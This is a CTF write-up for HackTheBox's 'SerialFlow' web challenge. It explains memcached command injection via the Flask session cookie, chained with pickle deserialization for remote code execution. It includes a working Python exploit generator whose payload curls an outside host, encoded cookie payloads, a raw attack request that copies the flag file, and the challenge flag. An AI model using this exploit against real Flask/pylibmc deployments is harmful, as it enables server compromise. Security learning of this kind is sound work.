---
name: SerialFlow (2024)
event: HackTheBox Cyber Apocalypse CTF 2024
category: Web
description: Writeup for SerialFlow (Web) - HackTheBox Cyber Apocalypse CTF (2024) 💜
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: false
  outline:
    visible: true
  pagination:
    visible: true
---

# SerialFlow

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/-vhl8ixthO4/0.jpg)](https://www.youtube.com/watch?v=-vhl8ixthO4?t=1530)

## Description

> SerialFlow is the main global network used by KORP, you have managed to reach a root server web interface by traversing KORP's external proxy network. Can you break into the root server and open pandoras box by revealing the truth behind KORP?

## Source

We can download the source code and see most of the app's functionality is in `app.py`.

{% code overflow="wrap" %}
```python
import pylibmc, uuid, sys
from flask import Flask, session, request, redirect, render_template
from flask_session import Session

app = Flask(__name__)

app.secret_key = uuid.uuid4()

app.config["SESSION_TYPE"] = "memcached"
app.config["SESSION_MEMCACHED"] = pylibmc.Client(["127.0.0.1:11211"])
app.config.from_object(__name__)

Session(app)

@app.before_request
def before_request():
    if session.get("session") and len(session["session"]) > 86:
        session["session"] = session["session"][:86]

@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, "description") else [str(x) for x in error.args]

    response = {
        "error": {
            "type": error.__class__.__name__,
            "message": message
        }
    }

    return response, error.code if hasattr(error, "code") else 500

@app.route("/set")
def set():
    uicolor = request.args.get("uicolor")

    if uicolor:
        session["uicolor"] = uicolor

    return redirect("/")

@app.route("/")
def main():
    uicolor = session.get("uicolor", "#f1f1f1")
    return render_template("index.html", uicolor=uicolor)
```
{% endcode %}

## Solution

Once again, the goal is clearly RCE since we have a `flag.txt` file at `/flag` with a randomised name.

I wasted a lot of time on rabbit holes and realise in hindsight, I should of investigated the `memcached` session stuff as it stands out as unusual.

A quick Google search of `memcached python vuln` returns some [general pentesting techniques](https://book.hacktricks.xyz/network-services-pentesting/11211-memcache) but also an interesting [PoC video](https://www.youtube.com/watch?v=aNqXNdFf28w) titled `Remote Code Execution (RCE) in Python pylibmc through memcached injection`. However, the exploit was demonstrated 10 years ago at [BlackHat 2014](https://www.youtube.com/watch?v=K4OWPdMLi64) so it's unlikely to be applicable, right?

Well, if we adjust our search options to "in the past year" one of the top results is the [Top 10 web hacking techniques](https://portswigger.net/research/top-10-web-hacking-techniques-of-2023-nominations-open) from Portswigger. Guess which vulnerability is featured there? 😼

That's right! [Exploiting Flask-Session with Memcached command injection utilizing crc32 collision and python pickle deserialization for RCE](https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc) by D4D.

The article explains the exploit better than I can but essentially, we can leverage the `/set` route to set the Flask session cookie value for the key `uicolor`. Memcached terminates commands and data sequences using CRLF so we want to inject `\r` using quoted strings (`\015\012`).

Next, we want to encode a payload. Since [python pickle](https://docs.python.org/3/library/pickle.html) is used to deserialise data before saving to Memcached, we can [construct a malicious pickle](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) that when deserialised, will trigger RCE.

Let's jump straight into testing the PoC! The only thing I changed is the command to `curl` (we want to verify the command executes) and the cache key/name to `420`.

{% code overflow="wrap" %}
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('curl https://cat.tunnelto.dev')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'137\r\nset BT_:420 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get BT_:420')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o", "\\")
        elif x < 8:
            pack += oct(x).replace("0o", "\\00")
        else:
            pack += oct(x).replace("0o", "\\0")

    return f"\"{pack}\""


print(generate_exploit())
```
{% endcode %}

We generate the payload, then simply replace our cookie value and make a call to the `/set` endpoint.

{% code overflow="wrap" %}
```bash
"\061\063\067\015\012\163\145\164\040\102\124\137\072\064\062\060\040\060\040\062\065\071\062\060\060\060\040\066\061\015\012\143\160\157\163\151\170\012\163\171\163\164\145\155\012\160\060\012\050\126\143\165\162\154\040\150\164\164\160\163\072\057\057\143\141\164\056\164\165\156\156\145\154\164\157\056\144\145\166\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\102\124\137\072\064\062\060"
```
{% endcode %}

I struggled for a while here, until I realised that `curl` is not installed on the machine lol 🤦‍♂️ If we change the command to `whoami` and test locally, we'll see `root` pop up in the logs 🙏

Furthermore, if we update the command to `cat /flag*.txt`, the flag will be printed in the server terminal! The problem is, we can't see the output on the remote instance 🤔

I tried to get a reverse shell, but it never made the connection (although I heard later others did have success with this). Ultimately, I ended up changing the `cmd` to `cp /flag*.txt application/templates/index.html`.

{% code overflow="wrap" %}
```bash
GET /set?uicolour=cat HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: close
Cookie: session="\061\063\067\015\012\163\145\164\040\102\124\137\072\064\062\060\040\060\040\062\065\071\062\060\060\060\040\067\070\015\012\143\160\157\163\151\170\012\163\171\163\164\145\155\012\160\060\012\050\126\143\160\040\057\146\154\141\147\052\056\164\170\164\040\141\160\160\154\151\143\141\164\151\157\156\057\164\145\155\160\154\141\164\145\163\057\151\156\144\145\170\056\150\164\155\154\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\102\124\137\072\064\062\060"
```
{% endcode %}

We might need to send the request several times, as the server seems to crash regularly. Eventually, the command will execute and `index.html` will be replaced with the flag. Therefore, when we follow the redirect, the flag is displayed.

Flag: `HTB{y0u_th0ught_th15_wou1d_b3_s1mpl3?}`
